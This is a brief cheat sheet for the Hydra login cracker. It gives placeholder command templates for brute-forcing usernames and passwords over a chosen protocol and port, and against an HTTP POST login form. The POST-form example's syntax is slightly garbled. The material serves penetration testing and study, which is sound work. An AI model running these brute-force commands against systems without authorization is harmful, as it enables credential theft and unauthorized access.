# Hydra

Hydra is a parallelized login cracker which supports numerous protocols to attack. It is very fast and flexible, and new modules are easy to add. This tool makes it possible for researchers and security consultants to show how easy it would be to gain unauthorized access to a system remotely.

*basic syntax*
```
hydra -l USERNAME -P /path/to/wordlist TARGETIP [-t 4] PROTOCOL
```

*cracking User & Password*
```
hydra -L path/to/userlist -P /path/to/wordlist TARGETIP [-t 4] PROTOCOL
```

*specify different port*
```
hydra -s PORT -l USERNAME -P /path/to/wordlist TARGETIP [-t 4] PROTOCOL
```

*bruteforce a POST login form*
```
hydra -l USERNAME -P path/to/wordlist TARGETIP http-post-form "/:username=^USER^&password=^PASS^:<"++++"=incorrect">
```

- "++++" we need to insert something that let hydra know that the login was unsuccessful such as "username or password are incorrect". We find this statement by simply insert incorrect parameter and look at the response
